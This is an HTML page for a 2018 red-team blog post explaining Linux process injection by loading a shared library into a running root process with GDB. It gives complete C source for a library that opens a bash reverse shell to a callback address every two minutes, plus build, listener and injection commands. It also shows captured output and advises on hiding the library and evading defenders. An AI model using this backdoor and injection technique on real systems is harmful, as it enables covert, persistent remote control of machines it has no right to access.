@@ -1,0 +1,689 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.11.1 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Process Injection with GDB  Mrs Quis Will Think of a Better Title</title>
+<meta name="description" content="Inspired byexcellent CobaltStrike training,I set out to work out an easy way to inject into processes in Linux.  There’sbeen quite a lot of experimentation with this already, usually using ptrace(2) orLD_PRELOAD,but I wanted something a little simpler and less error-prone, perhaps tradingease-of-use for flexibility and works-everywhere.  Enter GDB and shared objectfiles (i.e. libraries).">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Mrs Quis Will Think of a Better Title">
+<meta property="og:title" content="Process Injection with GDB">
+<meta property="og:url" content="https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html">
+
+
+  <meta property="og:description" content="Inspired byexcellent CobaltStrike training,I set out to work out an easy way to inject into processes in Linux.  There’sbeen quite a lot of experimentation with this already, usually using ptrace(2) orLD_PRELOAD,but I wanted something a little simpler and less error-prone, perhaps tradingease-of-use for flexibility and works-everywhere.  Enter GDB and shared objectfiles (i.e. libraries).">
+
+
+
+
+
+  <meta name="twitter:site" content="@magisterquis">
+  <meta name="twitter:title" content="Process Injection with GDB">
+  <meta name="twitter:description" content="Inspired byexcellent CobaltStrike training,I set out to work out an easy way to inject into processes in Linux.  There’sbeen quite a lot of experimentation with this already, usually using ptrace(2) orLD_PRELOAD,but I wanted something a little simpler and less error-prone, perhaps tradingease-of-use for flexibility and works-everywhere.  Enter GDB and shared objectfiles (i.e. libraries).">
+  <meta name="twitter:url" content="https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2018-03-11T00:00:00-05:00">
+
+
+
+
+
+
+<link rel="canonical" href="https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Mrs Quis Will Think of a Better Title Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Mrs Quis Will Think of a Better Title</a>
+        <ul class="visible-links">
+          
+            
+            <li class="masthead__menu-item">
+              <a href="https://magisterquis.github.io/about" >About</a>
+            </li>
+          
+        </ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Stuart</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Professional Red Teamer.  Less-professional security researcher.
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">DCish</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://twitter.com/magisterquis" itemprop="sameAs">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/magisterquis" itemprop="sameAs">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Process Injection with GDB">
+    <meta itemprop="description" content="Inspired byexcellent CobaltStrike training,I set out to work out an easy way to inject into processes in Linux.  There’sbeen quite a lot of experimentation with this already, usually using ptrace(2) orLD_PRELOAD,but I wanted something a little simpler and less error-prone, perhaps tradingease-of-use for flexibility and works-everywhere.  Enter GDB and shared objectfiles (i.e. libraries).">
+    <meta itemprop="datePublished" content="March 11, 2018">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Process Injection with GDB
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  8 minute read
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> contents</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#caveats">Caveats</a>
+    <ul>
+      <li><a href="#ptrace2">ptrace(2)</a></li>
+      <li><a href="#stopped-processes">Stopped Processes</a></li>
+      <li><a href="#process-death">Process Death</a></li>
+    </ul>
+  </li>
+  <li><a href="#on-target">On Target</a>
+    <ul>
+      <li><a href="#process-selection">Process Selection</a></li>
+      <li><a href="#malware">Malware</a></li>
+      <li><a href="#injection">Injection</a></li>
+    </ul>
+  </li>
+  <li><a href="#artifacts">Artifacts</a>
+    <ul>
+      <li><a href="#process-listing">Process listing</a></li>
+      <li><a href="#files-on-disk">Files on disk</a></li>
+      <li><a href="#service-disruption">Service disruption</a></li>
+    </ul>
+  </li>
+  <li><a href="#tldr">TL;DR</a></li>
+</ul>
+            </nav>
+          </aside>
+        
+        <p>Inspired by
+<a href="https://specterops.io/how-we-help/training-offerings/adversary-tactics-red-team-operations">excellent CobaltStrike training</a>,
+I set out to work out an easy way to inject into processes in Linux.  There’s
+been quite a lot of experimentation with this already, usually using 
+<a href="https://github.com/gaffe23/linux-inject"><code class="highlighter-rouge">ptrace(2)</code></a> or
+<a href="https://www.datawire.io/code-injection-on-linux-and-macos/"><code class="highlighter-rouge">LD_PRELOAD</code></a>,
+but I wanted something a little simpler and less error-prone, perhaps trading
+ease-of-use for flexibility and works-everywhere.  Enter GDB and shared object
+files (i.e. libraries).</p>
+
+<p>GDB, for those who’ve never found themselves with a bug unsolvable with lots of
+well-placed <code class="highlighter-rouge">printf("Here\n")</code> statements, is the GNU debugger.  It’s typical
+use is to poke at a runnnig process for debugging, but it has one interesting
+feature: it can have the debugged process call library functions.  There are
+two functions which we can use to load a library into to the program:
+<code class="highlighter-rouge">dlopen(3)</code> from libdl, and <code class="highlighter-rouge">__libc_dlopen_mode</code>, libc’s implementation.  We’ll
+use <code class="highlighter-rouge">__libc_dlopen_mode</code> because it doesn’t require the host process to have
+libdl linked in.</p>
+
+<p>In principle, we could load our library and have GDB call one of its functions.
+Easier than that is to have the library’s constructor function do whatever we
+would have done manually in another thread, to keep the amount of time the
+process is stopped to a minimum.  More below.</p>
+
+<h2 id="caveats">Caveats</h2>
+
+<p>Trading flexibility for ease-of-use puts a few restrictions on where and how we
+can inject our own code.  In practice, this isn’t a problem, but there are a
+few gotchas to consider.</p>
+
+<h3 id="ptrace2"><code class="highlighter-rouge">ptrace(2)</code></h3>
+
+<p>We’ll need to be able to attach to the process with <code class="highlighter-rouge">ptrace(2)</code>, which GDB uses
+under the hood.  Root can usually do this, but as a user, we can only attach to
+our own processes.  To make it harder, some systems only allow processes to
+attach to their children, which can be changed via a
+<a href="https://www.kernel.org/doc/Documentation/security/Yama.txt">sysctl</a>.  Changing
+the sysctl requires root, so it’s not very useful in practice.  Just in case:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sysctl kernel.yama.ptrace_scope<span class="o">=</span>0
+<span class="c"># or</span>
+<span class="nb">echo </span>0 <span class="o">&gt;</span> /proc/sys/kernel/yama/ptrace_scope
+</code></pre></div></div>
+<p>Generally, it’s better to do this as root.</p>
+
+<h3 id="stopped-processes">Stopped Processes</h3>
+
+<p>When GDB attaches to a process, the process is stopped.  It’s best to script
+GDB’s actions beforehand, either with <code class="highlighter-rouge">-x</code> and <code class="highlighter-rouge">--batch</code> or <code class="highlighter-rouge">echo</code>ing commands
+to GDB minimize the amount of time the process isn’t doing whatever it should
+be doing.  If, for whatever reason, GDB doesn’t restart the process when it
+exits, sending the process <code class="highlighter-rouge">SIGCONT</code> should do the trick.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">kill</span> <span class="nt">-CONT</span> &lt;PID&gt;
+</code></pre></div></div>
+
+<h3 id="process-death">Process Death</h3>
+
+<p>Once our library’s loaded and running, anything that goes wrong with it (e.g.
+segfaults) affects the entire process.  Likewise, if it writes output or sends
+messages to syslog, they’ll show up as coming from the process.  It’s not a bad
+idea to use the injected library as a loader to spawn actual malware in new
+proceses.</p>
+
+<h2 id="on-target">On Target</h2>
+
+<p>With all of that in mind, let’s look at how to do it.  We’ll assume ssh access
+to a target, though in principle this can (should) all be scripted and can be
+run with shell/sql/file injection or whatever other method.</p>
+
+<h3 id="process-selection">Process Selection</h3>
+
+<p>First step is to find a process into which to inject.  Let’s look at a process
+listing, less kernel threads:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu-s-1vcpu-1gb-nyc1-01:~# ps -fxo pid,user,args | egrep -v ' \[\S+\]$'
+  PID USER     COMMAND
+    1 root     /sbin/init
+  625 root     /lib/systemd/systemd-journald
+  664 root     /sbin/lvmetad -f
+  696 root     /lib/systemd/systemd-udevd
+ 1266 root     /sbin/iscsid
+ 1267 root     /sbin/iscsid
+ 1273 root     /usr/lib/accountsservice/accounts-daemon
+ 1278 root     /usr/sbin/sshd -D
+ 1447 root      \_ sshd: root@pts/1
+ 1520 root          \_ -bash
+ 1538 root              \_ ps -fxo pid,user,args
+ 1539 root              \_ grep -E --color=auto -v  \[\S+\]$
+ 1282 root     /lib/systemd/systemd-logind
+ 1295 root     /usr/bin/lxcfs /var/lib/lxcfs/
+ 1298 root     /usr/sbin/acpid
+ 1312 root     /usr/sbin/cron -f
+ 1316 root     /usr/lib/snapd/snapd
+ 1356 root     /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
+ 1358 root     /usr/lib/policykit-1/polkitd --no-debug
+ 1413 root     /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
+ 1415 root     /sbin/agetty --noclear tty1 linux
+ 1449 root     /lib/systemd/systemd --user
+ 1451 root      \_ (sd-pam)
+</code></pre></div></div>
+<p>Some good choices in there.  Ideally we’ll use a long-running process which
+nobody’s going to want to kill.  Processes with low pids tend to work nicely,
+as they’re started early and nobody wants to find out what happens when they
+die.  It’s helpful to inject into something running as root to avoid having to
+worry about permissions.  Even better is a process that nobody wants to kill
+but which isn’t doing anything useful anyway.</p>
+
+<p>In some cases, something short-lived, killable, and running as a user is good
+if the injected code only needs to run for a short time (e.g. something to
+survey the box, grab creds, and leave) or if there’s a good chance it’ll need
+to be stopped the hard way.  It’s a judgement call.</p>
+
+<p>We’ll use <code class="highlighter-rouge">664 root     /sbin/lvmetad -f</code>.  It should be able to do anything
+we’d like and if something goes wrong we can restart it, <em>probably</em> without too
+much fuss.</p>
+
+<h3 id="malware">Malware</h3>
+
+<p>More or less any linux shared object file can be injected.  We’ll make a small
+one for demonstration purposes, but I’ve injected multi-megabyte backdoors
+written in Go as well.  A lot of the fiddling that went into making this blog
+post was done using <a href="https://github.com/magisterquis/pcapknock">pcapknock</a>.</p>
+
+<p>For the sake of simplicity, we’ll use the following.  Note that a lot of error
+handling has been elided for brevity.  In practice, getting meaningful error
+output from injected libraries’ constructor functions isn’t as straightforward
+as a simple <code class="highlighter-rouge">warn("something"); return;</code> unless you really trust the standard
+error of your victim process.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;pthread.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="cp">#define SLEEP  120                    </span><span class="cm">/* Time to sleep between callbacks */</span><span class="cp">
+#define CBADDR "&lt;REDACTED&gt;"           </span><span class="cm">/* Callback address */</span><span class="cp">
+#define CBPORT "4444"                 </span><span class="cm">/* Callback port */</span><span class="cp">
+</span>
+<span class="cm">/* Reverse shell command */</span>
+<span class="cp">#define CMD "echo 'exec &gt;&amp;/dev/tcp/"\
+            CBADDR "/" CBPORT "; exec 0&gt;&amp;1' | /bin/bash"
+</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">callback</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">a</span><span class="p">);</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="cm">/* Run this function on library load */</span>
+<span class="kt">void</span> <span class="n">start_callbacks</span><span class="p">(){</span>
+        <span class="n">pthread_t</span> <span class="n">tid</span><span class="p">;</span>
+        <span class="n">pthread_attr_t</span> <span class="n">attr</span><span class="p">;</span>
+
+        <span class="cm">/* Start thread detached */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">pthread_attr_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">attr</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">pthread_attr_setdetachstate</span><span class="p">(</span><span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span>
+                                <span class="n">PTHREAD_CREATE_DETACHED</span><span class="p">))</span> <span class="p">{</span>
+                <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="cm">/* Spawn a thread to do the real work */</span>
+        <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="n">callback</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cm">/* callback tries to spawn a reverse shell every so often.  */</span>
+<span class="kt">void</span> <span class="o">*</span>
+<span class="n">callback</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
+                <span class="cm">/* Try to spawn a reverse shell */</span>
+                <span class="n">system</span><span class="p">(</span><span class="n">CMD</span><span class="p">);</span>
+                <span class="cm">/* Wait until next shell */</span>
+                <span class="n">sleep</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>In a nutshell, this will spawn an unencrypted, unauthenticated reverse shell to
+a hardcoded address and port every couple of minutes.  The
+<code class="highlighter-rouge">__attribute__((constructor))</code> applied to <code class="highlighter-rouge">start_callbacks()</code> causes it to run
+when the library is loaded.  All <code class="highlighter-rouge">start_callbacks()</code> does is spawn a thread to
+make reverse shells.</p>
+
+<p>Building a library is similar to building any C program, except that <code class="highlighter-rouge">-fPIC</code>
+and <code class="highlighter-rouge">-shared</code> must be given to the compiler.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cc <span class="nt">-O2</span> <span class="nt">-fPIC</span> <span class="nt">-o</span> libcallback.so ./callback.c <span class="nt">-lpthread</span> <span class="nt">-shared</span>
+</code></pre></div></div>
+<p>It’s not a bad idea to optimize the output with <code class="highlighter-rouge">-O2</code> to maybe consume less CPU
+time.  Of course, on a real engagement the injected library will be
+significantly more complex than this example.</p>
+
+<h3 id="injection">Injection</h3>
+
+<p>Now that we have the injectable library created, we can do the deed.  First
+thing to do is start a listener to catch the callbacks:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvl</span> 4444 <span class="c">#OpenBSD netcat ftw!</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">__libc_dlopen_mode</code> takes two arguments, the path to the library and flags as
+an integer.  The path to the library will be visible, so it’s best to put it
+somewhere inconspicuous, like <code class="highlighter-rouge">/usr/lib</code>.  We’ll use <code class="highlighter-rouge">2</code> for the flags, which
+corresponds to <code class="highlighter-rouge">dlopen(3)</code>’s
+<a href="http://man7.org/linux/man-pages/man3/dlopen.3.htm"><code class="highlighter-rouge">RTLD_NOW</code></a>.  To get GDB to
+cause the process to run the function, we’ll use GDB’s <code class="highlighter-rouge">print</code> command, which
+conviently gives us the function’s return value.  Instead of typing the command
+into GDB, which takes eons in program time, we’ll echo it into GDB’s standard
+input.  This has the nice side-effect of causing GDB to exit without needing
+a <code class="highlighter-rouge">quit</code> command.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu-s-1vcpu-1gb-nyc1-01:~# <span class="nb">echo</span> <span class="s1">'print __libc_dlopen_mode("/root/libcallback.so", 2)'</span> | gdb <span class="nt">-p</span> 664
+GNU gdb <span class="o">(</span>Ubuntu 7.11.1-0ubuntu1~16.5<span class="o">)</span> 7.11.1
+Copyright <span class="o">(</span>C<span class="o">)</span> 2016 Free Software Foundation, Inc.
+...snip...
+0x00007f6ca1cf75d3 <span class="k">in select</span> <span class="o">()</span> at ../sysdeps/unix/syscall-template.S:84
+84      ../sysdeps/unix/syscall-template.S: No such file or directory.
+<span class="o">(</span>gdb<span class="o">)</span> <span class="o">[</span>New Thread 0x7f6c9bfff700 <span class="o">(</span>LWP 1590<span class="o">)]</span>
+<span class="nv">$1</span> <span class="o">=</span> 312536496
+<span class="o">(</span>gdb<span class="o">)</span> quit
+A debugging session is active.
+
+        Inferior 1 <span class="o">[</span>process 664] will be detached.
+
+Quit anyway? <span class="o">(</span>y or n<span class="o">)</span> <span class="o">[</span>answered Y<span class="p">;</span> input not from terminal]
+Detaching from program: /sbin/lvmetad, process 664
+</code></pre></div></div>
+
+<p>Checking netcat, we’ve caught the callback:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>stuart@c2server:/home/stuart]
+<span class="nv">$ </span>nc <span class="nt">-nvl</span> 4444
+Connection from &lt;REDACTED&gt; 50184 received!
+ps <span class="nt">-fxo</span> pid,user,args
+...snip...
+  664 root     /sbin/lvmetad <span class="nt">-f</span>
+ 1591 root      <span class="se">\_</span> sh <span class="nt">-c</span> <span class="nb">echo</span> <span class="s1">'exec &gt;&amp;/dev/tcp/&lt;REDACTED&gt;/4444; exec 0&gt;&amp;1'</span> | /bin/bash
+ 1593 root          <span class="se">\_</span> /bin/bash
+ 1620 root              <span class="se">\_</span> ps <span class="nt">-fxo</span> pid,user,args
+...snip...
+</code></pre></div></div>
+
+<p>That’s it, we’ve got execution in another process.</p>
+
+<p>If the injection had failed, we’d have seen <code class="highlighter-rouge">$1 = 0</code>, indicating
+<code class="highlighter-rouge">__libc_dlopen_mode</code> returned <code class="highlighter-rouge">NULL</code>.</p>
+
+<h2 id="artifacts">Artifacts</h2>
+
+<p>There are several places defenders might catch us.  The risk of detection can
+be minimized to a certain extent, but without a rootkit, there’s always some
+way to see we’ve done something.  Of course, the best way to hide is to not
+raise suspicions in the first place.</p>
+
+<h3 id="process-listing">Process listing</h3>
+
+<p>A process listing like the one above will show that the process into which
+we’ve injected malware has funny child processes.  This can be avoided by
+either having the library doule-fork a child process to do the actual work or
+having the injected library do everything from within the victim process.</p>
+
+<h3 id="files-on-disk">Files on disk</h3>
+
+<p>The loaded library has to start on disk, which leaves disk artifacts, and the
+original path to the library is visible in <code class="highlighter-rouge">/proc/pid/maps</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ubuntu-s-1vcpu-1gb-nyc1-01:~# <span class="nb">cat</span> /proc/664/maps                                                      
+...snip...
+7f6ca0650000-7f6ca0651000 r-xp 00000000 fd:01 61077    /root/libcallback.so                        
+7f6ca0651000-7f6ca0850000 <span class="nt">---p</span> 00001000 fd:01 61077    /root/libcallback.so                        
+7f6ca0850000-7f6ca0851000 r--p 00000000 fd:01 61077    /root/libcallback.so
+7f6ca0851000-7f6ca0852000 rw-p 00001000 fd:01 61077    /root/libcallback.so            
+...snip...
+</code></pre></div></div>
+<p>If we delete the library, <code class="highlighter-rouge">(deleted)</code> is appended to the filename (i.e.
+<code class="highlighter-rouge">/root/libcallback.so (deleted)</code>), which looks even weirder.  This is somewhat
+mitigated by putting the library somewhere libraries normally live, like
+<code class="highlighter-rouge">/usr/lib</code>, and naming it something normal-looking.</p>
+
+<h3 id="service-disruption">Service disruption</h3>
+
+<p>Loading the library stops the running process for a short amount of time, and
+if the library causes process instability, it may crash the process or at least
+cause it to log warning messages (on a related note, don’t inject into
+<a href="https://twitter.com/MagisterQuis/status/972601551893291008"><code class="highlighter-rouge">systemd(1)</code></a>, it
+causes segfaults and makes <code class="highlighter-rouge">shutdown(8)</code> hang the box).</p>
+
+<h2 id="tldr">TL;DR</h2>
+<p>Process injection on Linux is reasonably easy:</p>
+<ol>
+  <li>Write a library (shared object file) with a constructor.</li>
+  <li>Load it with <code class="highlighter-rouge">echo 'print __libc_dlopen_mode("/path/to/library.so", 2)' | gdb -p &lt;PID&gt;</code></li>
+</ol>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-03-11T00:00:00-05:00">March 11, 2018</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?via=magisterquis&text=Process+Injection+with+GDB%20https%3A%2F%2Fmagisterquis.github.io%2F2018%2F03%2F11%2Fprocess-injection-with-gdb.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmagisterquis.github.io%2F2018%2F03%2F11%2Fprocess-injection-with-gdb.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=https%3A%2F%2Fmagisterquis.github.io%2F2018%2F03%2F11%2Fprocess-injection-with-gdb.html" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmagisterquis.github.io%2F2018%2F03%2F11%2Fprocess-injection-with-gdb.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/2018/03/04/First-post.html" class="pagination--pager" title="First Post
+">Previous</a>
+    
+    
+      <a href="/2018/03/31/in-memory-only-elf-execution.html" class="pagination--pager" title="In-Memory-Only ELF Execution (Without tmpfs)
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+    
+      <li><a href="https://twitter.com/magisterquis"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+    
+    
+    
+      <li><a href="https://github.com/magisterquis"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+    
+    
+    
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Stuart. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.0.9/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  </body>
+</html>
